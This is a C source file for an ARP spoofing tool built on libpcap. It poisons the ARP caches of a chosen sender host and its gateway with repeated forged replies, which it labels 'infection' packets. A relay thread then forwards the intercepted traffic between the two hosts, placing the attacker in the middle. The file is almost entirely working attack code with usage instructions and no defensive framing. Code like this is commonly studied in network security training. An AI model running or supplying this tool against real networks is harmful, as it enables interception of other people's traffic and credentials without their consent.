#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <netdb.h>
#include <linux/if.h>

#define PACKETSIZE sizeof(struct allpacket)

char myip[40] = {'\0',};
u_int8_t mymac[6];

struct allpacket {
    u_int8_t eth_dmac[6];
    u_int8_t eth_smac[6];
    u_short type;
    u_short hd_type;
    u_short protocol_type;
    u_char hd_size;
    u_char protocol_size;
    u_short opcode;
    u_int8_t arp_sender_mac[6];
    u_int32_t arp_sender_ip;
    u_int8_t arp_target_mac[6];
    u_int32_t arp_target_ip;
};

struct addr_save_db {
    u_int8_t save_smac[6];
    u_int32_t save_sip;
    u_int32_t save_tip;
    u_int8_t gateway[6];
};

struct ifreq s;
struct ifreq ifr;

#define ARP                  0x0806
#define ARP_HD_TYPE          0x0001
#define ARP_HD_SIZE          0x06
#define ARP_PROTOCOL_TYPE    0x0800
#define ARP_PROTOCOL_SIZE    0x04
#define ARP_OPCODE_REQUEST   1
#define ARP_OPCODE_REPLY     2

void *thread_infect(void *arg);
void *thread_relay(void *arg);
int mac_check(u_int8_t *mac1, u_int8_t *mac2);
void broadcast(char *argv[], pcap_t *handle);
void gateway_mac(char *argv[], pcap_t *handle);

int main(int argc, char *argv[]) {
	if (argc <= 2 || argc % 2 == 1) {
		printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
		printf("ex : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
		return -1;
	}

	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	strcpy(s.ifr_name, argv[1]);
	ioctl(fd, SIOCGIFHWADDR, &s);

	int i = 0;
	for (i = 0; i < 6; i++){
		mymac[i] = (u_int8_t)s.ifr_addr.sa_data[i];
	}

	int skt = 0;

	skt = socket(AF_INET,SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);

	if (ioctl(skt, SIOCGIFADDR, &ifr) < 0) {
		printf("couldn't get ip address\n");
	}else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, myip, sizeof(struct sockaddr));
	}

	pcap_t *handle;
	const u_char *packet;
	struct pcap_pkthdr *header;

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE] = {'\0',};
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	for(i = 1; i <= argc / 2 - 1; i++){
		broadcast(argv, handle);
	}

	struct addr_save_db *addr_save;
	struct addr_save_db addr_save_db;

	pthread_t jthread[2];
	while(1){
		pcap_next_ex(handle, &header, &packet);
		struct allpacket *new_packet = (struct allpacket*)packet;

		addr_save = (struct addr_save_db*)malloc(sizeof (struct addr_save_db));

		if (ntohs(new_packet->type) == ARP && ntohs(new_packet->opcode) == ARP_OPCODE_REPLY && 
		new_packet->arp_sender_ip == inet_addr(argv[2])) {
			addr_save->save_sip = new_packet->arp_sender_ip;
			addr_save->save_tip = new_packet->arp_target_ip;
			for(i = 0; i < 6; i++){
				addr_save->save_smac[i] = new_packet->eth_smac[i];
			}

			pthread_create(&jthread[0], NULL, thread_infect, (void*)addr_save);
			break;
		}
	}

	gateway_mac(argv, handle);

	while(1){
		pcap_next_ex(handle, &header, &packet);
		struct allpacket * rcv_packet = (struct allpacket*)packet;

		if (mac_check(rcv_packet->eth_dmac, mymac) == 1 && rcv_packet->arp_sender_ip == addr_save->save_tip && 
		ntohs(rcv_packet->type) == ARP && ntohs(rcv_packet->opcode) == ARP_OPCODE_REPLY) {
			for(i = 0; i < 6; i++){
				addr_save->gateway[i] = rcv_packet->eth_smac[i];
			}
			break;
		}
	}

	pthread_create(&jthread[1], NULL, thread_relay, (void*)addr_save);

	while(1){
		printf("try to search...\n");
	}
	pcap_close(handle);
	return 0;
}

void *thread_infect(void *arg){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(s.ifr_name, BUFSIZ, 1, 1, errbuf);

	struct addr_save_db *addr_save = (struct addr_save_db*)arg;

	u_char pkt[PACKETSIZE] = {'\0',};
	struct allpacket * infect = (struct allpacket*)pkt;

	int sw = 1;
	int i = 0;
	while(1){
		if (sw > 2)
			sw = 1;

		if (sw == 1)
			for(i = 0; i <= 5; i++)
				infect->eth_dmac[i] = addr_save->save_smac[i];
		else
			for(i = 0; i <= 5; i++)
				infect->eth_dmac[i] = addr_save->gateway[i];
		printf("\n");

		for(i = 0; i <= 5; i++)
			infect->eth_smac[i] = mymac[i];

		infect->type = ntohs(ARP);
		infect->hd_type = ntohs(ARP_HD_TYPE);
		infect->protocol_type = ntohs(ARP_PROTOCOL_TYPE);
		infect->hd_size = ARP_HD_SIZE;
		infect->protocol_size = ARP_PROTOCOL_SIZE;
		infect->opcode = ntohs(ARP_OPCODE_REPLY);

		for(i = 0; i <= 5; i++)
			infect->arp_sender_mac[i] = infect->eth_smac[i];

		if (sw == 1)
			infect->arp_sender_ip = addr_save->save_tip;
		else
			infect->arp_sender_ip = addr_save->save_sip;

		if (sw == 1)
			for(i = 0; i <= 5; i++)
				infect->arp_target_mac[i] = addr_save->save_smac[i];
		else
			for(i = 0; i <= 5; i++)
				infect->arp_target_mac[i] = addr_save->gateway[i];

		if (sw == 1)
			infect->arp_target_ip = addr_save->save_sip;
		else
			infect->arp_target_ip = addr_save->save_tip;

		int res = pcap_sendpacket(handle, pkt, sizeof(pkt));
		sw += 1;
		if (res == -1)
			printf("Infection-packet send failed..\n");
		else
			printf("Infection-packet send success!!!\n");
	}
}

void *thread_relay(void *arg){
	struct addr_save_db * add_save = (struct addr_save_db*)arg;
	char errbuf[PCAP_ERRBUF_SIZE] = {'\0',};
	int res = 0;
	pcap_t *handle = pcap_open_live(s.ifr_name, BUFSIZ, 1, 1, errbuf);
	struct pcap_pkthdr *header;
	const u_char *packet;
	int i = 0;

	while(1){
		pcap_next_ex(handle,&header,&packet);

		u_int pktsize = header->caplen;
		u_char cp_packet[pktsize] = {'\0',};

		struct ether_header *eth_hdr = (struct ether_header*)packet;
		struct iphdr *ip_hdr = (struct iphdr*)(14 + packet);

		if (ip_hdr->daddr == inet_addr(myip))
			continue;

		if (mac_check(eth_hdr->ether_shost, add_save->save_smac) == 1 && ip_hdr->saddr == add_save->save_sip) {
			for(i = 0; i < 6; i++){
				eth_hdr->ether_dhost[i] = add_save->gateway[i];
				eth_hdr->ether_shost[i] = mymac[i];
			}

			memcpy(cp_packet, packet, pktsize);
			res = pcap_sendpacket(handle, cp_packet, (int)pktsize);
			if (res == -1) {
				printf("Sender's Relay-packet send failed..\n");
				continue;
			}else {
				printf("Sender's Relay-packet send success!!!\n");
				continue;
			}
		}

		if (mac_check(eth_hdr->ether_shost, add_save->gateway) == 1 && ip_hdr->daddr == add_save->save_sip) {
			for(i = 0; i < 6; i++){
				eth_hdr->ether_dhost[i] = add_save->save_smac[i];
				eth_hdr->ether_shost[i] = mymac[i];
			}
			memcpy(cp_packet, packet, pktsize);
			res = pcap_sendpacket(handle, cp_packet, (int)pktsize);
			if (res == -1)
				printf("Relay-packet send failed..\n");
			else
				printf("Relay-packet send success!!!\n");
		}
	}
}

int mac_check(u_int8_t *mac1, u_int8_t *mac2){
	int i = 0;
	for(i = 0; i < 6; i++)
		if (mac1[i] != mac2[i])
			return 0;

	return 1;
}

void broadcast(char* argv[],pcap_t *handle){
	int i = 0;
	printf("[*] ARP Spoofing Start!\n");

	u_char pkt[PACKETSIZE] = {'\0',};
	struct allpacket *s_packet = (struct allpacket*)pkt;

	printf("Destination Mac Address : ");

	for(i = 0; i <= 5; i++){
		s_packet->eth_dmac[i] = 0xff;
	}

	for(i = 0; i <= 5; i++){
		s_packet->eth_smac[i] = mymac[i];
	}

	s_packet->type = ntohs(ARP);
	s_packet->hd_type = ntohs(ARP_HD_TYPE);
	s_packet->protocol_type = ntohs(ARP_PROTOCOL_TYPE);
	s_packet->hd_size = ARP_HD_SIZE;
	s_packet->protocol_size = ARP_PROTOCOL_SIZE;
	s_packet->opcode = ntohs(ARP_OPCODE_REQUEST);

	for(i = 0; i <= 5; i++){
		s_packet->arp_sender_mac[i] = s_packet->eth_smac[i];
	}

	s_packet->arp_sender_ip = inet_addr(argv[3]);

	for(i = 0; i <= 5; i++){
		s_packet->arp_target_mac[i] = 0x00;
	}

	printf("\n\n");

	s_packet->arp_target_ip = inet_addr(argv[2]);

	int res = pcap_sendpacket(handle, pkt, sizeof(pkt));

	if (res == -1)
		printf("BroadCast failed..\n");
	else
		printf("BroadCast success!!!\n");
}

void gateway_mac(char *argv[], pcap_t *handle){
	u_char pkt[PACKETSIZE] = {'\0',};
	struct allpacket *s_packet = (struct allpacket*)pkt;
	int i = 0;

	for(i = 0; i <= 5; i++){
		s_packet->eth_dmac[i] = 0xff;
	}

	for(i = 0; i <= 5; i++){
		s_packet->eth_smac[i] = mymac[i];
	}

	s_packet->type = ntohs(ARP);
	s_packet->hd_type = ntohs(ARP_HD_TYPE);
	s_packet->protocol_type = ntohs(ARP_PROTOCOL_TYPE);
	s_packet->hd_size = ARP_HD_SIZE;
	s_packet->protocol_size = ARP_PROTOCOL_SIZE;
	s_packet->opcode = ntohs(ARP_OPCODE_REQUEST);

	for(i = 0; i <= 5; i++){
		s_packet->arp_sender_mac[i] = s_packet->eth_smac[i];
	}

	s_packet->arp_sender_ip = inet_addr(myip);

	for(i = 0; i <= 5; i++){
		s_packet->arp_target_mac[i] = 0x00;
	}

	s_packet->arp_target_ip = inet_addr(argv[3]);

	int res = pcap_sendpacket(handle, pkt, sizeof(pkt));

	if (res == -1)
		printf("Gateway BroadCast failed..\n");
	else
		printf("Gateway BroadCast success!!!\n");
}
